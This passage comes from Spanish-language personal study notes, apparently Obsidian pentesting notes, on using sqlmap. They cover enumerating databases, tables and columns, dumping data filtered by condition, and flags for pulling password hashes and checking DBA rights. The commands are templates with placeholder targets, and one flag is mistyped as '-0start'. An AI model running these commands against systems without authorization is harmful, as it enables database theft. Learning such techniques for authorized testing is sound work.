--hostname
--current-db: nombre BBDD actual
--passwords: hashes de contraseñas
--is-dba: comprobar si el usuario tiene derechos de admin

## Enumeracion de BBDD

```
sqlmap -u URL --dbs
```

## Enumeracion de tablas

```
sqlmap -u URL -D BBDD --tables
```


![[Pasted image 20260714132035.png]]


#### Dumpeo de tablas

```
sqlmap -u URL -D BBDD -T TABLA --dump
```


![[Pasted image 20260714132111.png]]

La salida se vuelca en un cvs que podemos ver mas adelante

## Enumeracion de tablas y filas

```
sqlmap -u URL -D BBDD -T TABLA --columns
```

```
sqlmap -u URL -D BBDD -T TABLA -C COLUMNA1,COLUMNA2 --dump
```

![[Pasted image 20260714132235.png]]

```
sqlmap -u URL -D BBDD -T TABLA -0start=2 --stop=3 --dump
```


![[Pasted image 20260714132307.png]]


## Enumeracion condicional

```
sqlmap -u URL -D BBDD -T TABLA --dump --where="COLUMNA1 LIKE 'PATRON'"
```

![[Pasted image 20260714132415.png]]

## Enumeracion completa de la BBDD

Solo --dump --> dumpeara la BBDD actual
Solo --dump-all --> se dumpeara todas las BBDD
--exclude-sysdb: excluye informacion de la BBDD del sistema y nos quitamos ruido
